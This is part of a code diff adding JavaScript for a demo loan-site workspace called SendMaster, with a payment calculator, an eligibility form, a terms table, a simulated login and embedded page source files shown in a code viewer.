+            document.querySelectorAll('.nav-link').forEach(el => el.classList.remove('active'));
+            const activeNavLink = document.getElementById('nav-' + pageId.replace('.html', ''));
+            if (activeNavLink) activeNavLink.classList.add('active');
+
+            // Scroll to top
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+
+            // Ensure mode is preview
+            switchMode('preview');
+        }
+
+        // Hero Calculator Input Event
+        function updateHeroCalc() {
+            const amountInput = document.getElementById('hero-amount');
+            const termInput = document.getElementById('hero-term');
+            
+            if (!amountInput || !termInput) return;
+
+            const amount = parseFloat(amountInput.value);
+            const termMonths = parseInt(termInput.value);
+
+            document.getElementById('hero-amount-val').textContent = '$' + amount.toLocaleString();
+
+            // Simple representative calculation formula (~10.5% interest rate baseline)
+            const monthlyRate = 0.105 / 12;
+            const monthlyPayment = (amount * monthlyRate * Math.pow(1 + monthlyRate, termMonths)) / (Math.pow(1 + monthlyRate, termMonths) - 1);
+
+            document.getElementById('hero-monthly-payment').textContent = '$' + Math.round(monthlyPayment).toLocaleString() + ' / mo';
+
+            // Sync to global object
+            currentLoanData.amount = amount;
+        }
+
+        function saveAndProceedToEligibility() {
+            saveState();
+            navigateTo('eligibility.html');
+        }
+
+        // Eligibility Form Handler
+        function handleEligibilitySubmit(e) {
+            e.preventDefault();
+
+            const amount = document.getElementById('el-amount').value;
+            const purpose = document.getElementById('el-purpose').value;
+            const state = document.getElementById('el-state').value;
+            const income = document.getElementById('el-income').value;
+            const termsChecked = document.getElementById('el-terms').checked;
+
+            const errBox = document.getElementById('eligibility-error');
+
+            if (!amount || !purpose || !state || !income || !termsChecked) {
+                errBox.classList.remove('d-none');
+                return;
+            }
+
+            errBox.classList.add('d-none');
+
+            // Save preferences
+            currentLoanData = {
+                amount: parseInt(amount),
+                purpose: purpose,
+                state: state,
+                income: income
+            };
+
+            saveState();
+            navigateTo('loan-details.html');
+        }
+
+        // Update Summary Banner on Page 3
+        function updateSummaryDisplay() {
+            const sumAmt = document.getElementById('summary-amount');
+            if (sumAmt) sumAmt.textContent = '$' + currentLoanData.amount.toLocaleString();
+
+            const sumPurp = document.getElementById('summary-purpose');
+            if (sumPurp) sumPurp.textContent = currentLoanData.purpose;
+
+            const sumState = document.getElementById('summary-state');
+            if (sumState) sumState.textContent = currentLoanData.state;
+
+            const sumInc = document.getElementById('summary-income');
+            if (sumInc) sumInc.textContent = currentLoanData.income;
+        }
+
+        // Render Loan Details Table based on selection
+        function renderLoanDetailsTable() {
+            const tableBody = document.getElementById('terms-table-body');
+            if (!tableBody) return;
+
+            const amount = currentLoanData.amount || 10000;
+            const terms = [24, 36, 48, 60];
+
+            let html = '';
+            terms.forEach(months => {
+                // Calculation using baseline ~9.9% - 14.9% representation
+                const r = 0.099 / 12;
+                const payment = (amount * r * Math.pow(1 + r, months)) / (Math.pow(1 + r, months) - 1);
+                const total = payment * months;
+
+                html += `
+                    <tr>
+                        <td class="fw-bold">${months} Months</td>
+                        <td><span class="badge bg-light text-dark border">6.99% - 19.99%</span></td>
+                        <td class="fw-bold text-success">$${Math.round(payment).toLocaleString()} / mo</td>
+                        <td class="text-muted">$${Math.round(total).toLocaleString()}</td>
+                    </tr>
+                `;
+            });
+
+            tableBody.innerHTML = html;
+        }
+
+        // Exact Button Action Trigger
+        function handleProceedClick(e) {
+            e.preventDefault();
+            navigateTo('login.html');
+        }
+
+        // Password Show/Hide Toggle
+        function togglePasswordVisibility() {
+            const pwdInput = document.getElementById('login-password');
+            const pwdIcon = document.getElementById('togglePasswordIcon');
+
+            if (pwdInput.type === 'password') {
+                pwdInput.type = 'text';
+                pwdIcon.classList.remove('fa-eye');
+                pwdIcon.classList.add('fa-eye-slash');
+            } else {
+                pwdInput.type = 'password';
+                pwdIcon.classList.remove('fa-eye-slash');
+                pwdIcon.classList.add('fa-eye');
+            }
+        }
+
+        // Demonstration Login Submit
+        function handleLoginSubmit(e) {
+            e.preventDefault();
+            const alertBox = document.getElementById('login-alert');
+            alertBox.classList.remove('d-none');
+
+            setTimeout(() => {
+                alert('Demonstration Login: Connection simulated successfully! In a live environment, this connects to your authentication backend.');
+                alertBox.classList.add('d-none');
+            }, 600);
+        }
+
+        function showForgotPasswordModal() {
+            alert('Password Recovery Demonstration: A password reset link would be emailed to your registered address.');
+        }
+
+        // Workspace Mode Switcher (Preview vs Code Files)
+        function switchMode(mode) {
+            const appContainer = document.getElementById('app-preview-container');
+            const codeContainer = document.getElementById('code-files-container');
+            const tabs = document.querySelectorAll('.workspace-tab');
+
+            tabs.forEach(tab => tab.classList.remove('active'));
+
+            if (mode === 'preview') {
+                appContainer.classList.remove('d-none');
+                codeContainer.classList.add('d-none');
+                tabs[0].classList.add('active');
+            } else {
+                appContainer.classList.add('d-none');
+                codeContainer.classList.remove('d-none');
+                tabs[1].classList.add('active');
+                showFileCode('index.html');
+            }
+        }
+
+        // Source Code Display Generator
+        const sourceFiles = {
+            'index.html': `<!-- index.html - SendMaster Loan Landing Page -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SendMaster Loans | Explore Options</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <nav class="navbar navbar-expand-lg navbar-light bg-white border-bottom">
+        <div class="container">
+            <a class="navbar-brand fw-bold" href="index.html">SendMaster</a>
+            <div class="collapse navbar-collapse">
+                <ul class="navbar-nav me-auto">
+                    <li class="nav-item"><a class="nav-link active" href="index.html">Home</a></li>
+                    <li class="nav-item"><a class="nav-link" href="eligibility.html">Check Eligibility</a></li>
+                    <li class="nav-item"><a class="nav-link" href="loan-details.html">Loan Details</a></li>
+                </ul>
+                <a href="login.html" class="btn btn-outline-dark me-2">Sign In</a>
+                <a href="eligibility.html" class="btn btn-success">Check Eligibility</a>
+            </div>
+        </div>
+    </nav>
+
+    <section class="hero-section text-white bg-dark py-5">
+        <div class="container">
+            <h1 class="display-5 fw-bold">Explore Your Loan Options</h1>
+            <p class="lead">Review customizable personal loan possibilities and U.S. lending criteria transparently.</p>
+            <a href="eligibility.html" class="btn btn-success btn-lg">Check Eligibility</a>
+        </div>
+    </section>
+
+    <footer class="bg-dark text-white py-4 mt-5">
+        <div class="container text-center">
+            <p class="small text-muted mb-0">Loan approval is not guaranteed. Subject to lender criteria.</p>
+        </div>
+    </footer>
+</body>
+</html>`,
+
+            'eligibility.html': `<!-- eligibility.html - Eligibility Criteria & Demo Form -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Check Your Loan Eligibility | SendMaster</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <div class="container py-5">
+        <h1 class="fw-bold mb-3">Check Your Loan Eligibility</h1>
+        <form id="eligibilityForm" action="loan-details.html">
+            <div class="mb-3">
+                <label class="form-label">Preferred Loan Amount ($USD)</label>
+                <input type="number" class="form-control" id="el-amount" min="1000" max="50000" required>
+            </div>
+            <div class="mb-3">
+                <label class="form-label">Primary Loan Purpose</label>
+                <select class="form-select" id="el-purpose" required>
+                    <option value="Debt Consolidation">Debt Consolidation</option>
+                    <option value="Home Improvement">Home Improvement</option>
+                </select>
+            </div>
+            <button type="submit" class="btn btn-success btn-lg">Continue</button>
+        </form>
+    </div>
+</body>
+</html>`,
+
+            'loan-details.html': `<!-- loan-details.html - Terms Review & Next Steps -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Review Your Loan Options | SendMaster</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <div class="container py-5">
+        <h1 class="fw-bold mb-4">Review Your Loan Options</h1>
+        
+        <!-- PROMINENT MANDATORY BUTTON CODE -->
+        <a href="login.html" class="btn btn-primary proceed-btn">
+            Proceed to Login to SendMaster
+        </a>
+    </div>
+</body>
+</html>`,
+
+            'login.html': `<!-- login.html - SendMaster Account Login -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to SendMaster</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <div class="container py-5">
+        <h1 class="h3 fw-bold text-center">Sign in to SendMaster</h1>
+        <form id="loginForm">
+            <div class="mb-3">
+                <label class="form-label">Email Address</label>
+                <input type="email" class="form-control" required>
+            </div>
+            <div class="mb-3">
+                <label class="form-label">Password</label>
+                <input type="password" class="form-control" required>
+            </div>
+            <button type="submit" class="btn btn-success w-100">Sign In</button>
+            <a href="index.html" class="d-block text-center mt-3">Return to Home</a>
+        </form>
+    </div>
+</body>
+</html>`,
+
+            'css/style.css': `/* css/style.css - SendMaster Common Stylesheet */
+:root {
+    --navy-primary: #0a192f;
+    --navy-secondary: #1e293b;
+    --green-accent: #10b981;
+    --green-hover: #059669;
+}
+
+body {
+    font-family: 'Inter', sans-serif;
+    color: #0f172a;
+    background-color: #f8fafc;
+}
+
+.btn-green {
+    background-color: var(--green-accent);
+    color: white;
+    border-radius: 8px;
+    font-weight: 600;
+}
+
+/* Proceed Button Requirements */
+.proceed-btn {
+    background-color: var(--navy-primary) !important;
+    border-color: var(--navy-primary) !important;
+    border-radius: 8px !important;
+    padding: 0.75rem 2rem !important;
+    font-weight: 600 !important;
+    transition: all 0.2s ease-in-out !important;
+}
+
+.proceed-btn:hover {
+    background-color: var(--green-accent) !important;
+    border-color: var(--green-accent) !important;
+}`,
+
+            'js/script.js': `// js/script.js - SendMaster Shared Logic & Persistence
+const STORAGE_KEY = 'sendmaster_loan_selection';
+
+document.addEventListener('DOMContentLoaded', () => {
+    console.log('SendMaster JS Loaded');
+});`
+        };
+
+        let activeFile = 'index.html';
+
+        function showFileCode(fileName) {
+            activeFile = fileName;
+            document.getElementById('current-filename').textContent = fileName;
+            document.getElementById('file-code-display').textContent = sourceFiles[fileName] || '// File empty';
+
+            // Highlight active button
+            document.querySelectorAll('#code-files-container .list-group-item').forEach(btn => btn.classList.remove('active'));
+            const activeBtn = document.getElementById('file-btn-' + fileName.replace('.html','').replace('css/style.css','css').replace('js/script.js','js'));
+            if (activeBtn) activeBtn.classList.add('active');
+        }
+
+        function copyCurrentCode() {
+            const textToCopy = sourceFiles[activeFile];
+            if (textToCopy) {
+                // Clipboard fallback helper compliant with sandbox rules
+                const hiddenTextArea = document.createElement('textarea');
+                hiddenTextArea.value = textToCopy;
+                document.body.appendChild(hiddenTextArea);
+                hiddenTextArea.select();
+                document.execCommand('copy');
+                document.body.removeChild(hiddenTextArea);
+
+                alert('Copied code for ' + activeFile + ' to clipboard!');
+            }
+        }
     </script>
 </body>
-
 </html>
